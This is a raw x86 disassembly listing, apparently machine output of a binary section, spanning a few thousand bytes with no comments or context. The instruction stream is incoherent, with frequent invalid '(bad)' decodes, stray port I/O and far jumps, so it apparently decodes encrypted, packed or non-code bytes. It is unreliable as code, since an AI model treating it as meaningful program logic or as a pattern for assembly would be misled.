  4117b6:	dec    ebp
  4117b7:	pop    edi
  4117b8:	mov    edi,0xfe39a25c
  4117bd:	or     DWORD PTR [ecx],0xe7b0aa53
  4117c3:	shl    DWORD PTR [edi],1
  4117c5:	mov    ebp,DWORD PTR [ebx+0x10c03fe]
  4117cb:	loopne 0x4117e4
  4117cd:	add    eax,0x3247b0bf
  4117d2:	mov    ecx,0x54fcc5fd
  4117d7:	add    esi,ebp
  4117d9:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  4117db:	cmp    eax,0xf8e27bf0
  4117e0:	dec    edi
  4117e1:	pusha  
  4117e2:	pop    ebp
  4117e3:	push   esi
  4117e4:	clc    
  4117e5:	stc    
  4117e6:	pop    ebx
  4117e7:	repnz mov esi,0xe136ec7e
  4117ed:	inc    ebp
  4117ee:	add    ch,BYTE PTR [ebx+edi*2-0x55]
  4117f2:	retf   0x11b0
  4117f5:	xor    ebp,ecx
  4117f7:	inc    esp
  4117f8:	jecxz  0x41178a
  4117fa:	(bad)  
  4117fc:	hlt    
  4117fd:	push   es
  4117fe:	sbb    eax,0x7f739a3d
  411803:	mov    DWORD PTR [eax+esi*2],eax
  411806:	sbb    eax,0xa3046edf
  41180b:	lods   al,BYTE PTR ds:[esi]
  41180c:	mov    dl,BYTE PTR [eax+0x18]
  41180f:	pop    esi
  411810:	(bad)  
  411811:	mov    ebp,0xb01ce8ae
  411816:	in     al,0x55
  411818:	jp     0x411862
  41181a:	fistp  QWORD PTR [ecx]
  41181c:	fndisi(8087 only) 
  41181e:	daa    
  41181f:	es xchg edi,eax
  411821:	mov    esp,0x7d236850
  411826:	out    0x65,al
  411828:	adc    BYTE PTR [edx+edx*1-0x4eaa85fa],ah
  41182f:	push   ss
  411830:	stc    
  411831:	aaa    
  411832:	stos   BYTE PTR es:[edi],al
  411833:	xor    DWORD PTR [ecx],eax
  411835:	bound  ebp,QWORD PTR [edi-0x6b]
  411838:	arpl   bx,cx
  41183a:	arpl   ax,bp
  41183c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41183d:	sub    BYTE PTR [ecx+ebx*1-0x1a1d9bad],bh
  411844:	dec    ebp
  411845:	xor    edi,DWORD PTR [edi-0x10ec811a]
  41184b:	cs jmp 0x1c0f3674
  411851:	adc    esi,edi
  411853:	add    DWORD PTR [edx+0x65],esp
  411856:	cmc    
  411857:	jo     0x411852
  411859:	stos   BYTE PTR es:[edi],al
  41185a:	pop    edi
  41185b:	mov    ds:0x13542d19,eax
  411860:	inc    ebp
  411861:	pop    esp
  411862:	test   al,0x5a
  411864:	adc    bh,BYTE PTR [eax+edx*4+0x4a]
  411868:	mov    esi,0xccc6ea4e
  41186d:	outs   dx,DWORD PTR ds:[esi]
  41186e:	push   0xffffff96
  411870:	jb     0x4118d5
  411872:	pop    edx
  411873:	das    
  411874:	ficom  WORD PTR [edi]
  411876:	mov    DWORD PTR [eax-0x5054594d],ebp
  41187c:	sar    BYTE PTR [eax-0x237c1fc8],cl
  411882:	aaa    
  411883:	(bad)  
  411886:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411887:	outs   dx,DWORD PTR ds:[esi]
  411888:	push   edx
  411889:	dec    ah
  41188b:	jecxz  0x411865
  41188d:	push   0x66
  41188f:	enter  0x85d2,0x64
  411893:	inc    edx
  411894:	cs sub al,0xb3
  411897:	pushf  
  411898:	test   edx,edx
  41189a:	rcr    DWORD PTR [ecx+eax*1+0x50efb5a8],cl
  4118a1:	or     DWORD PTR [eax+0x1076c0c7],eax
  4118a7:	mov    dh,0xce
  4118a9:	xor    BYTE PTR [ebp+0x0],ah
  4118ac:	jle    0x4118bd
  4118ae:	pop    ds
  4118af:	push   cs
  4118b0:	mov    ecx,0xdddc2e16
  4118b5:	cmp    esi,ecx
  4118b7:	xchg   BYTE PTR [ebx-0x7f],dl
  4118ba:	cli    
  4118bb:	xchg   ebx,eax
  4118bc:	cmp    eax,0xe56f4713
  4118c1:	je     0x411907
  4118c3:	ds push ds
  4118c5:	sbb    esi,DWORD PTR [eax-0xdd350b3]
  4118cb:	aas    
  4118cc:	mov    bh,0xd9
  4118ce:	fs mov bh,0xf8
  4118d1:	arpl   WORD PTR [edx+edx*8],sp
  4118d4:	push   ebp
  4118d5:	fnsave [edx-0x80]
  4118d8:	jo     0x41185d
  4118da:	out    0x9d,al
  4118dc:	bound  ebp,QWORD PTR [edi+0xb7f4ec]
  4118e2:	clc    
  4118e3:	inc    edx
  4118e4:	lods   eax,DWORD PTR ds:[esi]
  4118e5:	test   DWORD PTR [esi-0x7658613f],esp
  4118eb:	call   0x29a88dc9
  4118f0:	sub    esp,DWORD PTR [ecx]
  4118f2:	dec    ebx
  4118f3:	fdivr  QWORD PTR [esi-0x56]
  4118f6:	jbe    0x411939
  4118f8:	mov    BYTE PTR [ecx+edx*1-0x643e567],bl
  4118ff:	arpl   bp,di
  411901:	add    DWORD PTR ds:0xcb13f269,edi
  411907:	(bad)  
  411908:	adc    eax,ebx
  41190a:	pop    esp
  41190b:	aam    0x6c
  41190d:	out    dx,al
  41190e:	pop    esi
  41190f:	dec    ebx
  411910:	add    DWORD PTR [edi+0x1a9ad9a1],ecx
  411916:	hlt    
  411917:	call   0xee05:0x631cfac8
  41191e:	jnp    0x411908
  411920:	or     al,0x2a
  411922:	cli    
  411923:	outs   dx,BYTE PTR ds:[esi]
  411924:	mov    edx,0x59c3325b
  411929:	(bad)  
  41192a:	cmp    BYTE PTR [edx-0x56],ah
  41192d:	loop   0x41196e
  41192f:	xchg   ecx,eax
  411930:	mov    ecx,0x2c4e368b
  411935:	push   esp
  411936:	inc    ecx
  411937:	push   esp
  411938:	push   ecx
  411939:	mov    ch,0x53
  41193b:	popa   
  41193c:	mul    BYTE PTR [ebp+0x36]
  41193f:	xlat   BYTE PTR ds:[ebx]
  411940:	add    DWORD PTR [eax+0x1b],eax
  411943:	xor    edx,edi
  411945:	jge    0x4119b9
  411947:	aad    0x34
  411949:	sub    bh,dh
  41194b:	or     esp,esp
  41194d:	mov    edi,0xd2b5920
  411952:	jmp    0x4118f3
  411954:	and    BYTE PTR [ebp+0x33],0x13
  411958:	ret    0x590a
  41195b:	sbb    eax,0x588c86e3
  411960:	mov    edx,fs
  411962:	je     0x411951
  411964:	jns    0x411997
  411966:	fdivr  QWORD PTR [eax]
  411968:	cmp    eax,0x436fbb8c
  41196d:	out    dx,eax
  41196e:	ins    BYTE PTR es:[edi],dx
  41196f:	(bad)  
  411970:	jmp    0xdeff:0xbe27b055
  411977:	test   al,0x3
  411979:	nop
  41197a:	test   DWORD PTR [eax+0x56],eax
  41197d:	jp     0x411917
  41197f:	sub    DWORD PTR [ecx-0x1dfc73e8],edx
  411985:	inc    eax
  411986:	pop    esi
  411987:	add    al,0xc3
  411989:	mov    esp,0x291f8c6e
  41198e:	inc    esp
  41198f:	mov    esp,0xae7cc377
  411994:	sbb    al,0x17
  411996:	loope  0x4119e8
  411998:	and    BYTE PTR [ecx+0x76f504a0],ch
  41199e:	repnz pusha 
  4119a0:	ja     0x411980
  4119a2:	ins    BYTE PTR es:[edi],dx
  4119a3:	xchg   edi,eax
  4119a4:	sbb    eax,0x54973a81
  4119a9:	cmp    eax,0xd452b793
  4119ae:	aad    0xea
  4119b0:	into   
  4119b1:	repnz int3 
  4119b3:	sub    eax,0xd5c5004
  4119b8:	xchg   ebp,eax
  4119b9:	xchg   ebp,eax
  4119ba:	rcr    DWORD PTR ds:0xbbc67cb8,0x73
  4119c1:	(bad)
  4119c4:	pop    edx
  4119c5:	push   edi
  4119c6:	mov    ah,0x9c
  4119c8:	xor    eax,0xf683050c
  4119cd:	cwde   
  4119ce:	dec    eax
  4119cf:	mov    ah,0x23
  4119d1:	ret    
  4119d2:	push   esi
  4119d3:	adc    BYTE PTR [ecx+0x55],ch
  4119d6:	pop    esp
  4119d7:	sub    ah,BYTE PTR [ebx-0x7a]
  4119da:	in     eax,0x36
  4119dc:	and    ecx,DWORD PTR [edx-0x4c]
  4119df:	jne    0x4119dc
  4119e1:	dec    eax
  4119e2:	lods   eax,DWORD PTR ds:[esi]
  4119e3:	jae    0x4119e1
  4119e5:	mov    dh,0x11
  4119e7:	das    
  4119e8:	jns    0x411a2c
  4119ea:	mov    ebp,0x5508fd33
  4119ef:	sbb    eax,0x8b367e1a
  4119f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119f5:	mov    cl,0x87
  4119f7:	mov    esp,0xce9a4ac5
  4119fc:	and    DWORD PTR es:[ecx+0xa],edx
  411a00:	mov    bl,0x46
  411a02:	arpl   WORD PTR [ecx-0x19],ax
  411a05:	cmp    esp,DWORD PTR ds:0xc53c734b
  411a0b:	shl    DWORD PTR [esi+eax*2],1
  411a0e:	cmp    eax,0xcc34b561
  411a13:	sahf   
  411a14:	mov    ds:0x7f82a236,eax
  411a19:	call   DWORD PTR [ecx]
  411a1b:	cmp    dh,BYTE PTR [ebp-0x4e38c6e9]
  411a21:	lods   eax,DWORD PTR ds:[esi]
  411a22:	clc    
  411a23:	mov    ch,0x15
  411a25:	icebp  
  411a26:	push   esi
  411a27:	in     eax,0xf2
  411a29:	xor    al,0xaa
  411a2b:	(bad)  
  411a2c:	jne    0x411a62
  411a2e:	scas   al,BYTE PTR es:[edi]
  411a2f:	stos   BYTE PTR es:[edi],al
  411a30:	sbb    al,ah
  411a32:	stos   BYTE PTR es:[edi],al
  411a33:	(bad)  
  411a34:	sub    eax,0x58e30f2f
  411a39:	mov    esp,DWORD PTR [ecx+0x4a]
  411a3c:	push   esp
  411a3d:	loopne 0x411a7b
  411a3f:	and    DWORD PTR [esi],eax
  411a41:	adc    cl,0x59
  411a44:	push   esp
  411a45:	push   cs
  411a46:	jecxz  0x4119eb
  411a48:	jmp    0xabd7:0x94de8d09
  411a4f:	inc    esi
  411a50:	mov    eax,ds:0xfdfe858e
  411a55:	mov    ecx,0x2c8390a8
  411a5a:	mov    ds:0x556588e8,eax
  411a5f:	call   0x430687f3
  411a64:	jnp    0x411a74
  411a66:	cld    
  411a67:	jp     0x411a1d
  411a69:	aad    0xd5
  411a6b:	dec    ebx
  411a6c:	int    0x0
  411a6e:	stc    
  411a6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a70:	sahf   
  411a71:	in     al,dx
  411a72:	lods   eax,DWORD PTR ds:[esi]
  411a73:	popa   
  411a74:	sbb    BYTE PTR [edx],cl
  411a76:	adc    BYTE PTR [edi-0xf],al
  411a79:	pop    esi
  411a7a:	push   edx
  411a7b:	cmovge edx,ecx
  411a7e:	sar    BYTE PTR [ebx-0x27],0x87
  411a82:	pop    edi
  411a83:	pop    di
  411a85:	cmp    BYTE PTR [ebx],dl
  411a87:	mov    eax,0x7b115c1a
  411a8c:	cmp    bl,BYTE PTR [ecx+0x18]
  411a8f:	daa    
  411a90:	pop    ecx
  411a91:	dec    edi
  411a92:	cli    
  411a93:	or     DWORD PTR [ecx+esi*2+0x236e824a],ebx
  411a9a:	mov    ds:0x5dabdc28,eax
  411a9f:	pop    ebx
  411aa0:	adc    al,0x8e
  411aa2:	jbe    0x411a43
  411aa4:	es call 0x9fa6:0x7f5519cc
  411aac:	sbb    BYTE PTR [edx-0x11582173],0xd7
  411ab3:	sbb    BYTE PTR [eax],bl
  411ab5:	popf   
  411ab6:	sahf   
  411ab7:	pop    edx
  411ab8:	std    
  411ab9:	outs   dx,DWORD PTR ds:[esi]
  411aba:	js     0x411aae
  411abc:	ror    DWORD PTR [ebx],cl
  411abe:	hlt    
  411abf:	lock jmp 0x411ab6
  411ac2:	pushf  
  411ac3:	stos   DWORD PTR es:[edi],eax
  411ac4:	stos   BYTE PTR es:[edi],al
  411ac5:	sar    esp,1
  411ac7:	out    0x5,eax
  411ac9:	mov    al,0xb7
  411acb:	pop    esi
  411acc:	add    dh,BYTE PTR fs:[edx+0x2aac5792]
  411ad3:	imul   edx,DWORD PTR [ecx],0xa979e840
  411ad9:	mov    edi,0x1c9e0561
  411ade:	adc    DWORD PTR [ebp+0x70baa2bd],0x399942b5
  411ae8:	or     DWORD PTR [esi],edi
  411aea:	and    BYTE PTR [esp+ebx*4-0x46cbabd0],bh
  411af1:	push   ds
  411af2:	test   eax,0xad7c71e6
  411af7:	call   0xf9a9:0xea56e99e
  411afe:	dec    edi
  411aff:	adc    dl,BYTE PTR [ecx+0x55]
  411b02:	mov    dh,0x79
  411b04:	push   ds
  411b05:	js     0x411b54
  411b07:	adc    eax,0x5b07ff96
  411b0c:	int3   
  411b0d:	sbb    eax,0x321d8045
  411b12:	jle    0x411b72
  411b14:	shl    BYTE PTR [ebx+0x7e],cl
  411b17:	push   esi
  411b18:	pop    ebx
  411b19:	mov    bl,BYTE PTR [eax]
  411b1b:	rcr    BYTE PTR [edx+0x18cb5e70],1
  411b21:	inc    eax
  411b22:	ss mov ebx,0xfca0e9a0
  411b28:	push   ecx
  411b29:	sar    BYTE PTR [edx],0x62
  411b2c:	mov    DWORD PTR [ebp-0xb25519a],esi
  411b32:	dec    ecx
  411b33:	pop    ds
  411b34:	cmp    dh,BYTE PTR [edi+0x16]
  411b37:	xchg   edx,eax
  411b38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b39:	jno    0x411b95
  411b3b:	(bad)  
  411b3d:	or     eax,0xc9e516c4
  411b42:	test   DWORD PTR [edi+edi*1+0x65],esi
  411b46:	xchg   edx,eax
  411b47:	outs   dx,DWORD PTR ds:[esi]
  411b48:	jbe    0x411b8b
  411b4a:	cs gs push esi
  411b4d:	mov    eax,ds:0xba47a629
  411b52:	lea    edi,[edx-0x2a]
  411b55:	inc    esp
  411b56:	cli    
  411b57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b58:	imul   ebx,DWORD PTR [ecx+ecx*2],0xffffff94
  411b5c:	stos   BYTE PTR es:[edi],al
  411b5d:	(bad)  
  411b5e:	or     eax,0xff2da98d
  411b63:	adc    al,0x54
  411b65:	cmp    bl,dl
  411b67:	mov    ch,bh
  411b69:	and    al,0x4c
  411b6b:	mov    BYTE PTR [edx-0x17],dl
  411b6e:	fisttp WORD PTR [edi-0x54153c4f]
  411b74:	sti    
  411b75:	ret    0xdf3a
  411b78:	push   ss
  411b79:	lahf   
  411b7a:	sbb    DWORD PTR [eax+0x1c],esp
  411b7d:	std    
  411b7e:	jg     0x411b9f
  411b80:	mov    edx,0x98d38b17
  411b85:	mov    cs,WORD PTR fs:[esi-0x448e4f67]
  411b8c:	in     al,0x46
  411b8e:	jmp    0x9a47:0xf89107d8
  411b95:	mov    ds:0x7f7bf729,al
  411b9a:	shr    DWORD PTR [ebp-0x62],0xaf
  411b9e:	ret    
  411b9f:	jle    0x411b31
  411ba1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ba3:	addr16 xor ch,bl
  411ba6:	stos   BYTE PTR es:[edi],al
  411ba7:	inc    esi
  411ba8:	lahf   
  411ba9:	inc    ecx
  411baa:	inc    esp
  411bab:	rcr    BYTE PTR [edi+0x297fbf0c],1
  411bb1:	loop   0x411c16
  411bb3:	push   esi
  411bb4:	xchg   edx,eax
  411bb5:	pop    esp
  411bb6:	in     al,0x9a
  411bb8:	enter  0xbd74,0xa5
  411bbc:	pop    es
  411bbd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411bbe:	sahf   
  411bbf:	and    ecx,DWORD PTR [eax+0x51]
  411bc2:	repz xor BYTE PTR [edx+0x41],0xcc
  411bc7:	ret    
  411bc8:	mov    esi,eax
  411bca:	out    0xca,eax
  411bcc:	mov    cs,WORD PTR [edx]
  411bce:	out    dx,al
  411bcf:	rcr    ebp,1
  411bd1:	fmulp  st(2),st
  411bd3:	ins    BYTE PTR es:[edi],dx
  411bd4:	and    DWORD PTR [eax],ebx
  411bd6:	div    BYTE PTR gs:[edi-0x791325f6]
  411bdd:	in     al,dx
  411bde:	mov    eax,0x3eb6f890
  411be3:	mov    ah,0xd9
  411be5:	and    esp,esp
  411be7:	inc    ecx
  411be8:	jb     0x411bab
  411bea:	dec    ebx
  411beb:	(bad)  
  411bec:	je     0x411c32
  411bee:	aad    0xf0
  411bf0:	sbb    DWORD PTR [edx],0x8f8f6585
  411bf6:	ret    
  411bf7:	adc    DWORD PTR [ebx],edi
  411bf9:	stos   DWORD PTR es:[edi],eax
  411bfa:	mov    edi,0x5ab7033e
  411bff:	out    dx,al
  411c00:	sub    al,0x58
  411c02:	add    dl,BYTE PTR [edi+eax*2+0x7eaac66d]
  411c09:	loope  0x411bd1
  411c0b:	push   0x76754ceb
  411c10:	test   al,0x5
  411c12:	inc    edi
  411c13:	mov    bl,0xd0
  411c15:	or     BYTE PTR ds:0x6069777f,bh
  411c1b:	pop    ebp
  411c1c:	mov    eax,0xc3745e
  411c21:	mov    al,ah
  411c23:	fisttp WORD PTR [edi-0x21]
  411c26:	add    al,0x6a
  411c28:	xor    BYTE PTR [ebx-0x54],ah
  411c2b:	sahf   
  411c2c:	jbe    0x411bb2
  411c2e:	int3   
  411c2f:	mov    al,BYTE PTR [ebx-0xf]
  411c32:	xor    BYTE PTR [ecx-0x5e],cl
  411c35:	fisttp WORD PTR [esi-0x6ae72af6]
  411c3b:	shr    BYTE PTR [edx+0x781cab44],0x30
  411c42:	ret    
  411c43:	clc    
  411c44:	mov    cl,BYTE PTR [ebp+ebp*1-0xaf60b8b]
  411c4b:	push   ecx
  411c4c:	or     edi,eax
  411c4e:	out    dx,al
  411c4f:	sahf   
  411c50:	push   ss
  411c51:	dec    edi
  411c52:	inc    edi
  411c53:	and    al,0xbc
  411c55:	(bad)  
  411c56:	jo     0x411c79
  411c58:	lock push ebx
  411c5a:	pop    ss
  411c5b:	inc    ebx
  411c5c:	xchg   esi,ebp
  411c5e:	mov    ebx,0xdd094d3e
  411c63:	mov    BYTE PTR [ecx-0x2e],ah
  411c66:	cwde   
  411c67:	xchg   edx,eax
  411c68:	cmp    BYTE PTR [eax-0x6a],al
  411c6b:	pusha  
  411c6c:	int3   
  411c6d:	int    0xd9
  411c6f:	inc    esi
  411c70:	push   ss
  411c71:	dec    ebx
  411c72:	scas   eax,DWORD PTR es:[edi]
  411c73:	mov    DWORD PTR [edi+0x647db4c8],ecx
  411c79:	stos   DWORD PTR es:[edi],eax
  411c7a:	cs cli 
  411c7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c7d:	outs   dx,DWORD PTR ds:[esi]
  411c7e:	sahf   
  411c7f:	in     al,dx
  411c80:	(bad)  
  411c81:	jle    0x411c65
  411c83:	sbb    BYTE PTR ss:0x5c1d5449,bh
  411c8a:	sar    DWORD PTR [esi+ebx*4+0x3fde2dc9],0xf6
  411c92:	loop   0x411cc6
  411c94:	aam    0xdf
  411c96:	xor    DWORD PTR [esi-0x24],eax
  411c99:	mov    dl,0xdf
  411c9b:	cli    
  411c9c:	pop    ss
  411c9d:	test   DWORD PTR ds:0xf2fa1992,eax
  411ca3:	inc    esp
  411ca4:	in     al,dx
  411ca5:	inc    ebp
  411ca6:	mov    cl,0x5c
  411ca8:	adc    ebp,ebp
  411caa:	adc    ah,ch
  411cac:	imul   ebx,DWORD PTR [eax+0x3e],0xbcd0f57f
  411cb3:	rcr    DWORD PTR [eax-0x6b],0xd7
  411cb7:	daa    
  411cb8:	xchg   DWORD PTR ds:0x7d5344cd,ebx
  411cbe:	mov    edi,DWORD PTR ds:0x9163bcf4
  411cc4:	out    0x93,eax
  411cc6:	inc    esi
  411cc7:	sahf   
  411cc8:	jne    0x411c68
  411cca:	sub    DWORD PTR cs:[edi],0xffffffca
  411cce:	stos   BYTE PTR es:[edi],al
  411ccf:	mov    bh,0xdc
  411cd1:	fwait
  411cd2:	mov    bl,BYTE PTR [edi]
  411cd4:	stc    
  411cd5:	(bad)  
  411cd6:	ja     0x411c77
  411cd8:	stos   DWORD PTR es:[edi],eax
  411cd9:	lahf   
  411cda:	sub    dl,BYTE PTR [ebx-0x2]
  411cdd:	repnz (bad) 
  411ce0:	jno    0x411c9b
  411ce2:	daa    
  411ce3:	mov    bl,0x16
  411ce5:	fldenv [ecx-0x4056b44c]
  411ceb:	retf   
  411cec:	xor    eax,0xc3211a83
  411cf1:	out    0xe0,al
  411cf3:	shl    DWORD PTR [edi+eiz*4],0x3b
  411cf7:	repz xor DWORD PTR ds:[edi+edx*8],0xc6cf5eae
  411d00:	pop    esi
  411d01:	xor    DWORD PTR [eax+ebp*4+0x7d],ebp
  411d05:	cwde   
  411d06:	in     eax,dx
  411d07:	lahf   
  411d08:	es sub ebx,esp
  411d0b:	inc    edx
  411d0c:	pop    eax
  411d0d:	sbb    bh,BYTE PTR es:[ebp-0x60561704]
  411d14:	sub    BYTE PTR [ebx],ah
  411d16:	out    0x11,al
  411d18:	or     eax,DWORD PTR [edx-0x319d270f]
  411d1e:	mov    eax,ds:0xbfa0f31d
  411d23:	mov    ebx,0xdefab684
  411d28:	int3   
  411d29:	jl     0x411cb9
  411d2b:	dec    ebp
  411d2c:	out    0xf2,al
  411d2e:	into   
  411d2f:	lahf   
  411d30:	(bad)  
  411d31:	lahf   
  411d32:	add    bh,BYTE PTR [ebx+0x6a753a19]
  411d38:	mov    bh,BYTE PTR [ecx]
  411d3a:	inc    edx
  411d3b:	cmc    
  411d3c:	inc    eax
  411d3d:	out    dx,eax
  411d3e:	mov    ch,0x2f
  411d40:	scas   eax,DWORD PTR es:[edi]
  411d41:	sti    
  411d42:	je     0x411d7b
  411d44:	mov    cl,0x46
  411d46:	push   es
  411d47:	sub    BYTE PTR [ebx],bl
  411d49:	add    ebp,DWORD PTR [esi]
  411d4b:	stos   BYTE PTR es:[edi],al
  411d4c:	rcl    bl,1
  411d4e:	ficomp DWORD PTR [ebx-0x68]
  411d51:	mov    al,0x64
  411d53:	xchg   edx,eax
  411d54:	adc    BYTE PTR [ecx],dh
  411d56:	scas   eax,DWORD PTR es:[edi]
  411d57:	cli    
  411d58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d59:	pop    es
  411d5a:	and    BYTE PTR [edx+0x7eaa26f],bh
  411d60:	fmul   st,st(4)
  411d62:	xchg   ebp,eax
  411d63:	fsubrp st(2),st
  411d65:	popw   ss
  411d67:	mov    cl,0xc4
  411d69:	out    0xca,al
  411d6b:	jp     0x411d17
  411d6d:	int3   
  411d6e:	jle    0x411dec
  411d70:	cwde   
  411d71:	cmp    esp,edx
  411d73:	ror    BYTE PTR [ecx+0x17],cl
  411d76:	xchg   ecx,eax
  411d77:	aas    
  411d78:	ret    0x519b
  411d7b:	ror    ah,cl
  411d7d:	mov    dl,0x80
  411d7f:	jne    0x411db9
  411d81:	or     esp,DWORD PTR [eax]
  411d83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d84:	add    bl,BYTE PTR [ecx+ebp*2+0x4e]
  411d88:	mov    ds:0x8db75223,al
  411d8d:	es xchg edi,eax
  411d8f:	out    dx,al
  411d90:	xor    al,0x21
  411d92:	pushf  
  411d93:	jle    0x411d60
  411d95:	cld    
  411d96:	out    dx,al
  411d97:	in     al,dx
  411d98:	xor    esi,DWORD PTR [edi+0x25]
  411d9b:	push   esp
  411d9c:	pop    ebx
  411d9d:	jle    0x411d86
  411d9f:	mov    esp,ebx
  411da1:	retf   0x64b7
  411da4:	or     DWORD PTR [esi-0x2c],0x8e84e783
  411dab:	and    esp,DWORD PTR [eiz*8+0x2d72ecd]
  411db2:	adc    esi,DWORD PTR [ebp-0x6794c248]
  411db8:	sbb    BYTE PTR [eax-0x22e46f4],0xfc
  411dbf:	push   0xf1e11b5e
  411dc4:	scas   eax,DWORD PTR es:[edi]
  411dc5:	or     al,cl
  411dc7:	sub    eax,0x845cb099
  411dcc:	(bad)  
  411dcd:	aas    
  411dce:	out    dx,eax
  411dcf:	inc    ebp
  411dd0:	imul   ecx,DWORD PTR [eax+edi*1+0x5817f6cc],0x69e7d2fa
  411ddb:	data16 sti 
  411ddd:	and    al,0x88
  411ddf:	sbb    DWORD PTR [edx-0xb06c7c8],0x4e3a5340
  411de9:	loopne 0x411e23
  411deb:	and    eax,0x2811116b
  411df0:	int3   
  411df1:	(bad)  
  411df3:	pop    ecx
  411df4:	cs idiv DWORD PTR fs:[ecx]
  411df8:	popf   
  411df9:	cmp    bh,BYTE PTR [edi-0x531b17bb]
  411dff:	push   ebp
  411e00:	mov    DWORD PTR [eax+0x48f1ea83],ebx
  411e06:	and    eax,0x33d6cd3e
  411e0b:	mov    ah,bl
  411e0d:	aaa    
  411e0e:	dec    edx
  411e0f:	(bad)  
  411e10:	jg     0x411df0
  411e12:	bound  esi,QWORD PTR [edx+ebp*1+0x64]
  411e16:	retf   0x4141
  411e19:	push   0x22dd66ed
  411e1e:	jmp    0x411dab
  411e20:	mov    dh,0x38
  411e22:	in     eax,0x2e
  411e24:	cmp    al,BYTE PTR [ebx-0x56e2f625]
  411e2a:	dec    ecx
  411e2b:	mov    al,BYTE PTR [esi]
  411e2d:	jmp    0x411e9b
  411e2f:	mov    BYTE PTR [ebx-0x2cbc46dd],ch
  411e35:	loope  0x411dc4
  411e37:	push   ds
  411e38:	mov    cl,0xf2
  411e3a:	xor    al,0xf4
  411e3c:	loope  0x411e5a
  411e3e:	das    
  411e3f:	mov    WORD PTR [edx],?
  411e41:	mov    eax,ds:0x8b473428
  411e46:	cli    
  411e47:	sbb    eax,0x6a712bb9
  411e4c:	sub    ebx,DWORD PTR [edx]
  411e4e:	sub    bh,dh
  411e50:	pop    esp
  411e51:	in     al,0x1d
  411e53:	mov    WORD PTR ds:0xd85d604c,ds
  411e59:	mov    bh,0xf3
  411e5b:	aaa    
  411e5c:	mov    dl,ah
  411e5e:	fwait
  411e5f:	jg     0x411ec9
  411e61:	inc    ebx
  411e62:	in     eax,0xc5
  411e64:	repz pop ebp
  411e66:	sbb    ch,al
  411e68:	scas   al,BYTE PTR es:[edi]
  411e69:	xchg   BYTE PTR [edx],ch
  411e6b:	inc    eax
  411e6c:	add    dl,BYTE PTR [ebx]
  411e6e:	or     eax,DWORD PTR [esi]
  411e70:	inc    esi
  411e71:	adc    ch,BYTE PTR [esp+eax*2-0x49dc6a7f]
  411e78:	push   ebx
  411e79:	pop    esp
  411e7a:	mov    dl,0x6f
  411e7c:	and    ecx,esp
  411e7e:	push   edi
  411e7f:	inc    esi
  411e80:	imul   esi,DWORD PTR [esi-0x46719773],0x53
  411e87:	jmp    0x411ed0
  411e89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e8a:	jp     0x411e48
  411e8c:	rcr    BYTE PTR [ebp+esi*2-0x64],cl
  411e90:	push   0xc7de69b6
  411e95:	or     eax,0x3bfe1120
  411e9a:	ret    0x6383
  411e9d:	fwait
  411e9e:	imul   ebp,ebx,0x13a36693
  411ea4:	(bad)  
  411ea5:	jmp    0x411ee4
  411ea7:	(bad)  
  411ea8:	cmp    BYTE PTR [ebx+eax*1+0x50],bl
  411eac:	mov    DWORD PTR [esi+0x6b6e1088],ebx
  411eb2:	(bad)  
  411eb3:	gs dec esi
  411eb5:	lea    edi,[ecx+ebx*4]
  411eb8:	mov    esp,0x190ab688
  411ebd:	xchg   edx,eax
  411ebe:	into   
  411ebf:	or     esp,eax
  411ec1:	sti    
  411ec2:	stc    
  411ec3:	cs int 0x4f
  411ec6:	mov    cl,0x4e
  411ec8:	adc    al,0xa0
  411eca:	pop    esi
  411ecb:	jo     0x411f4b
  411ecd:	lods   eax,DWORD PTR ds:[esi]
  411ece:	push   ebx
  411ecf:	and    al,0xda
  411ed1:	mov    al,ds:0xb9099f02
  411ed6:	jp     0x411ea9
  411ed8:	cld    
  411ed9:	or     BYTE PTR [edx+0x23],0xec
  411edd:	push   es
  411ede:	add    DWORD PTR [ecx+0x7e5539b6],ebx
  411ee4:	ficomp DWORD PTR [ebx+0x74]
  411ee7:	call   0xc7f5:0x1c2d6ccb
  411eee:	lahf   
  411eef:	retf   0x9b1f
  411ef2:	pop    edi
  411ef3:	sbb    DWORD PTR [edi],ebx
  411ef5:	js     0x411f26
  411ef7:	ss inc ebp
  411ef9:	mov    ecx,0x72a2ceb4
  411efe:	jle    0x411f6e
  411f00:	xchg   esi,eax
  411f01:	shr    BYTE PTR [ebx+edx*1-0x385e23d3],0xfb
  411f09:	fdivr  DWORD PTR [ebp-0x61d08a22]
  411f0f:	aad    0x86
  411f11:	mov    ebx,0x479e8003
  411f16:	push   0x4b
  411f18:	sub    eax,0x27b1e7f3
  411f1d:	inc    esp
  411f1e:	jnp    0x411f64
  411f20:	xor    edx,DWORD PTR [esi+esi*4-0x5615f3b8]
  411f27:	stos   DWORD PTR es:[edi],eax
  411f28:	or     al,0x54
  411f2a:	shr    al,0x4a
  411f2d:	das    
  411f2e:	inc    edi
  411f2f:	pop    esi
  411f30:	jo     0x411f8f
  411f32:	or     al,0x5d
  411f34:	and    al,0x37
  411f36:	adc    ecx,DWORD PTR [esi+0x26dfc4cd]
  411f3c:	sbb    al,0x13
  411f3e:	push   edx
  411f3f:	push   cs
  411f40:	ja     0x411f62
  411f42:	mov    esi,0xf6719e25
  411f47:	mov    ah,bl
  411f49:	outs   dx,BYTE PTR ds:[esi]
  411f4a:	mov    al,0xe4
  411f4c:	adc    eax,0x85978257
  411f51:	mov    edx,0xc784a740
  411f56:	pop    ss
  411f57:	in     eax,0xe5
  411f59:	in     eax,0x88
  411f5b:	xor    ah,BYTE PTR [edx]
  411f5d:	int    0x12
  411f5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f60:	int    0x3c
  411f62:	std    
  411f63:	jbe    0x411f9f
  411f65:	daa    
  411f66:	push   ebp
  411f67:	push   edx
